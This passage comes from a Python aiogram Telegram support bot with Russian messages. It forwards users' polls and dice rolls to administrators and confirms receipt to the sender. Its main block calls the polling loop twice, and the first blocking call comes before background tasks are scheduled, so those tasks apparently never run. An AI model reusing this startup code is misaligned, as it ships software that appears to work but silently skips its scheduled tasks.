                    f"{header}📊 *Опрос:*\n*Вопрос:* {poll.question}\n*Варианты:* {', '.join([option.text for option in poll.options])}\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'dice':
                dice = message.dice
                await bot.send_message(
                    admin_id,
                    f"{header}🎲 *Игральная кость:*\n*Значение:* {dice.value}\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
        except Exception as e:
            logging.error(f"Ошибка при отправке сообщения администратору {admin_id}: {e}")

    await message.answer('✅ Ваше сообщение отправлено в поддержку. Спасибо за обращение!')
    await state.finish()

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
    asyncio.set_event_loop(loop)
    loop.create_task(start_background_tasks())
    try:
        executor.start_polling(dp, skip_updates=True)
    finally:
        loop.close()